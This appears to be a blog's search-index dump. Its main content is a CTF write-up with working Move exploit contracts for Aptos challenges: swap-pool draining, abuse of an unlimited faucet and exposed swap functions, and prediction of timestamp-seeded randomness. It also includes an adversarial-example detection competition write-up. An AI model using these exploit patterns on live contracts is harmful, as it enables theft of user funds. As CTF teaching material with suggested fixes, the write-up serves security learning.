[{"categories":["Web3"],"content":"Writeup for CTF MOVEment with Aptos Dec 2022","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Preface It’s been half a year since I last wrote a blog. During that time, I’ve learned a lot about Web3 security, including Solana and Aptos. Last weekend, I participated in the CTF MOVEment with Aptos Dec 2022 jointly organized by MoveBit, Aptos, ChainFlag and OtterSec, and scored two first-bloods and two second-bloods in the four challenges except the sanity-check, ranking first in the end. In this post, I will briefly introduce the solutions to the five challenges. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:1:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 1: checkin Challenge Info Source: https://github.com/movebit/ctfmovement-1 Link: http://47.243.227.164:20000/web/ Score: 100 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract The challenge 1 is a sanity-check to let players get familiar with how to use aptos-cli to communicate with the private chain where the challenge contract is deployed. There is a get_flag function in the contract, and once it’s called it will emit an Flag event. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Solution After initializing an account and invoking the get_flag function via aptos-cli, we can submit the transaction hash to the challenge website, the server will check whether this transaction triggers the Flag event, and if so, the server will return the flag. aptos init --assume-yes --network custom --rest-url http://8.218.146.10:9080 --faucet-url http://8.218.146.10:9081 aptos move run --assume-yes --function-id VICTIM_ADDRESS::checkin::get_flag ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 2: hello move Challenge Info Source: https://github.com/movebit/ctfmovement-2 Link: http://47.243.227.164:20001/web/ Score: 200 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract The challenge 2 is a simple challenge to let players get familiar with the Move language. The contract has five functions: init_challenge, hash, discrete_log, add, pow and get_flag. The init_challenge function is used to initialize the challenge by sending the caller a Challenge object with 5 members, balance=10, q1=false, q2=false, q3=false, and an event handler. q1, q2, q3 indicates the solving status of the 3 sub-problems in this challenge, and these status will be checked in the get_flag function. q1: hash q1 will be set to true if we invoke the hash function and provide a guess: vector\u003cu8\u003e satisfying len(guess)==4 \u0026\u0026 keccak256(guess+\"move\")==\"d9ad5396ce1ed307e8fb2a90de7fd01d888c02950ef6852fbc2191d2baf58e79\". This can be solved by writing a simple script to brute-force all the possible guesses, and the answer is good. q2: discrete_log In order to set q2 to true, we need to provide a guess: u128 satisfying pow(10549609011087404693, guess, 18446744073709551616) == 18164541542389285005, which is a classic discrete logarithm problem. We can solve this with discrete_log(18164541542389285005,Mod(10549609011087404693,18446744073709551616)) in sage, and the answer is $3123592912467026955$. q3: add The sub-problem q3 is more interesting. Similar to other checked arithmetic implementation, the Shl and Shr operations in Move language will raise an ARITHMETIC_ERROR if the shift amount is greater than or equal to the bit width of the operand as this is a cpu-level undefined behavior. And the Shl operations won’t raise ARITHMETIC_ERROR if there is an overflow. So we can shift the current balance $10$ to the left by more than $8$ bits to set the balance to $0$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution2{usestd::signer;usestd::vector;usectfmovement::hello_move;publicentryfunsolve(account: \u0026signer){hello_move::init_challenge(account);hello_move::hash(account,vector[103,111,111,100]);hello_move::discrete_log(account,3123592912467026955);hello_move::add(account,3,5);hello_move::add(account,3,5);hello_move::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 3: swap empty Challenge Info Source: https://github.com/movebit/ctfmovement-3 Link: http://47.243.227.164:20002/web/ Score: 200 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This target contract implements a very simple swap protocol, which allows users to swap between two tokens Coin1 and Coin2. The contract has a get_coin function to let the user get an airdrop of $5$ Coin1 and $5$ Coin2, two functions swap_12 and swap_21 to swap between Coin1 and Coin2, and a get_flag function checks whether the amount of Coin1 or Coin2 in the reserved account is 0. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability The vulnerability is the design of the get_amouts_out function. This contract uses a very naive way of calculating the amount of token that can be exchanged based on the ratio of Coin1 and Coin2 in the reserve account. However, this design is not safe, consider the following POC: Attacker get $5$ Coin1 and $5$ Coin2 from airdrop User: $5$ Coin1, $5$ Coin2; Reserve: $50$ Coin1, $50$ Coin2 Attacker swap $5$ Coin2 to $5\\cdot\\frac{50}{50}=5$ Coin1 User: $10$ Coin1, $0$ Coin2; Reserve: $45$ Coin1, $55$ Coin2 Attacker swap $10$ Coin1 to $10\\cdot\\frac{55}{45}=12$ Coin2 User: $0$ Coin1, $12$ Coin2; Reserve: $55$ Coin1, $43$ Coin2 Attacker swap $12$ Coin2 to $12\\cdot\\frac{55}{43}=15$ Coin1 User: $15$ Coin1, $0$ Coin2; Reserve: $40$ Coin1, $55$ Coin2 … By repeating this process, a malicious user could drain almost all the tokens in the reserved accounts. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution3{usestd::signer;usestd::vector;useaptos_framework::coin::{Self,Coin};usectfmovement::pool::{Self,Coin1,Coin2};publicentryfunsolve(account: \u0026signer){pool::get_coin(account);letcoin2=coin::withdraw\u003cCoin2\u003e(account,5);letcoin1=pool::swap_21(\u0026mutcoin2,5);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,10);letcoin2=pool::swap_12(\u0026mutcoin1,10);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin2=coin::withdraw\u003cCoin2\u003e(account,12);letcoin1=pool::swap_21(\u0026mutcoin2,12);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,15);letcoin2=pool::swap_12(\u0026mutcoin1,15);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin2=coin::withdraw\u003cCoin2\u003e(account,20);letcoin1=pool::swap_21(\u0026mutcoin2,20);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,24);letcoin2=pool::swap_12(\u0026mutcoin1,24);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);pool::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Possible fix One possible fix is to use the following formula to calculate the number of tokens that can be exchanged, to ensure that the product of the two token amounts is always constant: publicfunget_amouts_out(pool: \u0026LiquidityPool,amount: u64,order: bool): u64 {let(token1,token2)=get_amounts(pool);if(order){return(amount*token2)/(token1+amount)}else{return(amount*token1)/(token2+amount)}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:4","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 4: simple swap Challenge Info Source: https://github.com/movebit/ctfmovement-4 Link: http://47.243.227.164:20003/web/ Score: 300 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This contract implements a Uniswap v2 like coin swap program that allows users to swap between TestUSDC and SimpleCoin with a $0.25%$ fee rate and a $0.1%$ bonus if a user swaps TestUSDC to SimpleCoin. In the initialization process, the admin added $10^{10}$ TestUSDC and $10^{10}$ SimpleCoin to the pool. The get_flag function will check if the user has at least $10^{10}$ SimpleCoin, if so, the user will get the flag. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability There are two vulnerabilities in this contract. The first vulnerability is that there is no limit on the amount of tokens that a user can claim via airdrop. An attacker can claim a large amount of tokens and then swap them to other tokens to drain the reserve pool. The second vulnerability is that the swap_exact_x_to_y_direct and swap_exact_y_to_x_direct functions are incorrectly exposed to the public. An attacker can call this function to swap tokens without paying the fee. Combining these two vulnerabilities, an attacker could first claim a large amount of TestUSDC and then swap an amount of TestUSDC equal to the current reserve pool for SimpleCoin each time to drain half of the reserve pool while receiving a $0.1%$ bonus. After $n$ repetitions, the amount of SimpleCoin in the reserve pool will be reduced to $10^{10}\\cdot\\frac{1}{2^n}$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution4{usestd::signer;usestd::vector;usectfmovement::simple_coin::{Self,SimpleCoin,CoinCap,TestUSDC};usectfmovement::swap::{Self,LPCoin};useaptos_framework::coin::{Self,BurnCapability,MintCapability,FreezeCapability,Coin};publicentryfunsolve(account: \u0026signer){simple_coin::claim_faucet(account,1000000000000000000);swap::check_or_register_coin_store\u003cSimpleCoin\u003e(account);letbase=10000000000;leti=0;while(i\u003c20){lettusdc=coin::withdraw\u003cTestUSDC\u003e(account,base);let(simple_coin,simple_coin_reward)=swap::swap_exact_y_to_x_direct\u003cSimpleCoin,TestUSDC\u003e(tusdc);coin::deposit\u003cSimpleCoin\u003e(signer::address_of(account),simple_coin);coin::deposit\u003cSimpleCoin\u003e(signer::address_of(account),simple_coin_reward);base=base*2;i=i+1;};simple_coin::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Possible fix Add a limit to the airdrop amount each account can claim Remove the public visibility modifier of the swap_exact_x_to_y_direct\u003cX, Y\u003e function to make it private ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:4","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 5: move lock v2 Challenge Info Source: https://github.com/movebit/ctfmovement-5 Link: http://47.243.227.164:20004/web/ Score: 400 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This contract generate a number by using a polynomial whose coefficients are generated by a string encrypted with script hash and several pseudo-random numbers. Flag event will be emitted if the user guesses the correct number. Obviously, it is almost impossible to guess the correct number, since the number of possible guesses is $2^{128}$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability The vulnerability is that the pesudorandom number is generated with a timestamp in seconds and a counter. The counter is initialized to $0$ and will be increased by $1$ each time a random number is generated. Therefore, both the timestamp and the counter are predictable. An attacker can just reuse most of the code in the target contract to generate a same polynomial and the correct number directly. Recall that the string is encrypted by XORing script hash and a constant, we need to call the exploit contract via a script. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution5{// // [*] Dependencies // useaptos_framework::transaction_context;useaptos_framework::timestamp;useaptos_framework::account;// use aptos_framework::event; // use aptos_std::debug; usestd::vector;// use std::signer; usestd::hash;usestd::bcs;// // [*] Structures // struct Polynomialhasdrop{degree: u64,coefficients: vector\u003cu8\u003e}struct Counterhaskey{value: u64 }usectfmovement::move_lock;constBASE: vector\u003cu8\u003e=b\"HoudiniWhoHoudiniMeThatsHoudiniWho\";// // [*] Module Initialization // funinit_module(creator: \u0026signer){move_to(creator,Counter{value: 0})}publicentryfunsolve(account: \u0026signer): bool acquiresCounter{letencrypted_string: vector\u003cu8\u003e=encrypt_string(BASE);letres_addr: address=account::create_resource_address(\u0026@ctfmovement,encrypted_string);letbys_addr: vector\u003cu8\u003e=bcs::to_bytes(\u0026res_addr);leti=0;letd=0;letcof: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();while(i\u003cvector::length(\u0026bys_addr)){letn1: u64 =gen_number()%(0xffasu64);letn2: u8 =(n1asu8);lettmp: u8 =*vector::borrow(\u0026bys_addr,i);vector::push_back(\u0026mutcof,n2^(tmp));i=i+5;d=d+1;};letpol: Polynomial=constructor(d,cof);letx: u64 =gen_number()%0xff;letresult=evaluate(\u0026mutpol,x);move_lock::unlock(account,result)}// // [*] Local functions // funincrement(): u64 acquiresCounter{letc_ref=\u0026mutborrow_global_mut\u003cCounter\u003e(@solution).value;*c_ref=*c_ref+1;*c_ref}funconstructor(_degree: u64,_coefficients: vector\u003cu8\u003e): Polynomial{Polynomial{degree: _degree,coefficients: _coefficients}}funpow(n: u64,e: u64): u64 {if(e==0){1}elseif(e==1){n}else{letp=pow(n,e/2);p=p*p;if(e%2==1){p=p*n;p}else{p}}}funevaluate(p: \u0026mutPolynomial,x: u64): u128{letresult: u128=0;leti: u64 =0;while(i\u003cp.degree){result=result+(((*vector::borrow(\u0026p.coefficients,i)asu64)*pow(x,i))asu128);i=i+1;};result}funseed(): vector\u003cu8\u003eacquiresCounter{letcounter=increment();letcounter_bytes=bcs::to_bytes(\u0026counter);lettimestamp: u64 =timestamp::now_seconds();lettimestamp_bytes: vector\u003cu8\u003e=bcs::to_bytes(\u0026timestamp);letdata: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();vector::append\u003cu8\u003e(\u0026mutdata,counter_bytes);vector::append\u003cu8\u003e(\u0026mutdata,timestamp_bytes);lethash: vector\u003cu8\u003e=hash::sha3_256(data);hash}funget_u64(bytes: vector\u003cu8\u003e): u64 {letvalue=0u64;leti=0u64;while(i\u003c8){value=value|((*vector::borrow(\u0026bytes,i)asu64)\u003c\u003c((8*(7-i))asu8));i=i+1;};returnvalue}fungen_number(): u64 acquiresCounter{let_seed: vector\u003cu8\u003e=seed();get_u64(_seed)}funencrypt_string(plaintext: vector\u003cu8\u003e): vector\u003cu8\u003e{letkey: vector\u003cu8\u003e=transaction_context::get_script_hash();letkey_len: u64 =vector::length(\u0026key);letciphertext: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();leti=0;while(i\u003cvector::length(\u0026plaintext)){vector::push_back(\u0026mutciphertext,*vector::borrow(\u0026plaintext,i)^*vector::borrow(\u0026key,(i%key_len)));i=i+1;};ciphertext}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["AI"],"content":"Writeup for CVPR 2022 Robust Models towards Openworld Classification Competition","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Art of Robustness Workshop on CVPR 2022 and SenseTime jointly organized a Robust AI Competition. This competition focuses on classification task defense and open set defense against adversarial attacks. Our team hit the top1 in the qualifying round and top 5 in the final round of the competition. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:0:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Competition Analysis During the competition, we mainly focused on Track II: Open Set Defense. Most defense methods aim to build robust model in the closed set (e.g., under fixed datasets with constrained perturbation types and budgets). However, in the real-world scenario, adversaries would bring more harms and challenges to the deep learning-based applications by generating unrestricted attacks, such as large and visible noises, perturbed images with unseen labels, etc. To accelerate the research on building robust models in the open set, we organize this challenge track. Participants are encouraged to develop a robust detector that could distinguish clean examples from perturbed ones on unseen noises and classes by training on a limited-scale dataset. In essence, it’s an adversarial example detection competition that requires participants to determine whether a input image is a benign sample or an adversarial example. In this area, our research center (SSC) has published two related papers [1][2], both of which use the similar idea that different kinds of adversarial samples will have unique characteristics. In [1], the authors proposed Magnet, which use an autoencoder to learn the manifold of normal examples. MagNet reconstructs adversarial examples by moving them towards the manifold. Therefore, adversarial examples with large perturbation could be detected directly based on the reconstruction error. If the input has a small perturbation, the noise can be eliminated and changed to a benign sample after decoding. In [2], robustness is used to filter out those samples that just cross the decision boundary, followed by other methods to filter out those large perturbation samples. We adopted a similar strategy in the final round. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:1:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Qualifying Round: Exploit a Information Leak In the qualifying round, we unexpectedly found that the file sizes of benign samples tended to be smaller while those of adversarial samples tended to be larger by sorting the images according to the file sizes. Initially, our conjecture was that due to the compression algorithm of PNG, the adversarial perturbation corrupts the locality smoothness of the pixels to some extent, which subsequently affects the effectiveness of PNG compression. However, after deeper analysis we found that the organizers introduced a huge information leak when saving the images: although all images have the suffix of .png, only the file type of the adversarial samples is actually PNG, and the actual file type of most images is JPEG, which are almost all benign samples. ❯ exa | wc -l 5000 ❯ file *.png | grep JPEG | wc -l 4627 ❯ file 0.png 0.png: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 224x224, components 3 ❯ file 35.png 35.png: PNG image data, 224 x 224, 8-bit/color RGB, non-interlaced By leveraging this information leakage, we achieved nearly 100% accuracy and became the top qualifier. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:2:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Final Round: Unique Characteristics of Adversarial Examples Unfortunately, the authors realized the information leak and fixed it in the final round. Therefore, we chose to use the strategy similar to the previous two papers where we first classify the potential adversarial examples and use different detection methods for different types of adversarial examples. We divided the adversarial examples into four categories, namely Adversarial Patch [3], Square Attack [4], Universial Adversial Patch (UAP) [5] or Fast Gradient Sign Method (FGSM) [6], and others. We locally constructed a dataset of about 2,000 adversarial examples and 18,000 benign samples, which consists of about 250 images of Patch, 250 images of Square, 500 UAP or FGSM images and the other 1,000 images generated by adversarial attacks that seek to minimize the $L_2$ perturbations. For Patch samples, we trained a autoencoder and used the reconstruction error of $L_{inf}$ distance as a judgment metric. As the patch adversarial examples have a significant noise in a region about 20*20, the reconstruction error tends to be close to 1 for that type of adversarial examples, while the reconstruction error for benign samples is closer to 0.            For Square samples, a distinctive feature is the presence of some colored vertical stripes and rectangles visible to the naked eye on the picture. And we noted that the H channel has significant vertical stripes after converting the color space to HSV space. Therefore, we further calculated the difference of the sum of each column. The larger the difference indicates that the corresponding image is more likely to be a Square sample.            For UAP and FGSM samples, they are characterized by the presence of some noise or continuous texture on the image. To make these features more prominent, we used a Laplacian operator to enhance the edges and subsequently enhance the effect of the noise. Similar to square samples, we observed that the noise in the V channel is more pronounced after transforming the images onto HSV space. To measure the amount of noise, we computed histograms for the V channel. The more the curve on the histograms plot is skewed in the positive direction of the x-axis, the more noisy the image is, and the more likely it is a UAP or FGSM sample. Therefore, we constructed an expression to determine the shape of the histogram curve and subsequently whether the image is an adversarial sample.           For other samples, we directly utilize the metrics used for square detection as the organizer will find out the best threshold that yields the highest F1-Score, rather than requiring us to make a binary classification. Our intention was to use the model output or sample robustness to make judgments, just as [2], but unfortunately the organizers of this competition did not provide model information, so these adversarial examples may have poor transferability against our locally trained model.           Distance to decision boundary of a blue normal example and brown adversarial example. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:3:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Ablation Study We constructed the dataset locally and evaluated our method. For Patch attack, the local F1 score on all adversarial examples is 0.2792, where the precision is 0.9829 and the recall is 0.1627. The F1 score for Patch is 0.9812, where the recall of Patch adv is 0.9795. For Square attack, the local F1 score on all adversarial examples is 0.2729, where the precision is 0.932 and the recall is 0.1609. The F1 score for Sqaure is 0.8007, where the recall of Square adv is 0.8614. For UAP or FGSM attack, the local F1 score on all adversarial examples is 0.478, where the precision is 0.8483 and the recall is 0.3328. The F1 score for UAP or FGSM is 0.8711, where the recall of UAP or FGSM adv is 0.8951. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:4:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Reference [1] Meng, Dongyu, and Chen, Hao. “Magnet: a two-pronged defense against adversarial examples.” CCS 2017. [2] Zhao, Zhe, et al. “Attack as defense: characterizing adversarial examples using robustness.” ISSTA 2021. [3] Karmon, Danny, et al. “LaVAN: Localized and Visible Adversarial Noise.” ICML 2018. [4] Andriushchenko, Maksym, et al. “Square Attack: A Query-Efficient Black-Box Adversarial Attack via Random Search.” ECCV 2020. [5] Moosavi-Dezfooli, Seyed-Mohsen, et al. “Universal adversarial perturbations.” arXiv 2016. [6] Goodfellow, Ian J, et al. “Explaining and harnessing adversarial examples.” arXiv 2014. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:5:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":null,"content":"Useful Links","date":"2020-10-03","objectID":"/links/","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"Friends Yuzhuo Jing Yintao Xu HaominStone Yimin Tang Yuhang Wu Zhenpeng Lin ","date":"2020-10-03","objectID":"/links/:1:0","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"CTF Nu1L Straw Hat ","date":"2020-10-03","objectID":"/links/:2:0","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"Publications by Qi Qin","date":"2020-10-03","objectID":"/publications/","tags":null,"title":"Publications","uri":"/publications/"},{"categories":null,"content":"Books Handbook for CTFers. Nu1L Team. Springer Singapore, 2022. Handbook for CTFers (Chinese). Nu1L Team. Publishing House of Electronics Industry, 2020. ","date":"2020-10-03","objectID":"/publications/:1:0","tags":null,"title":"Publications","uri":"/publications/"},{"categories":null,"content":"Papers ","date":"2020-10-03","objectID":"/publications/:2:0","tags":null,"title":"Publications","uri":"/publications/"},{"categories":null,"content":"2022 DeJITLeak: Eliminating JIT-Induced Timing Side-Channel Leaks Qi Qin, JulianAndres JiYang, Fu Song, Taolue Chen, Xinyu Xing ESEC/FSE 2022 [Paper] [Code] ","date":"2020-10-03","objectID":"/publications/:2:1","tags":null,"title":"Publications","uri":"/publications/"}]